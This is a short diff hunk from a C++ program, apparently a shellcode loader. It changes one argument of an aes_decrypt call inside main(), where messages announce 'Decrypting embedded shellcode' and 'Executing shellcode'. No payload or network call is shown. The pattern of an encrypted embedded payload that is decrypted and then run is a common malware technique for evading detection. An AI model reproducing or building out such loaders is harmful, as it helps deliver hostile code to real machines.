@@ -24759,7 +24759,7 @@ int main() {
     try {
         std::cout << "[+] Decrypting embedded shellcode...\n";
 
-        std::vector<uint8_t> decrypted_shellcode = aes_decrypt(encrypted_shellcode, aes_key);
+        std::vector<uint8_t> decrypted_shellcode = aes_decrypt(shellcode, aes_key);
 
         std::cout << "[+] Executing shellcode...\n";
 
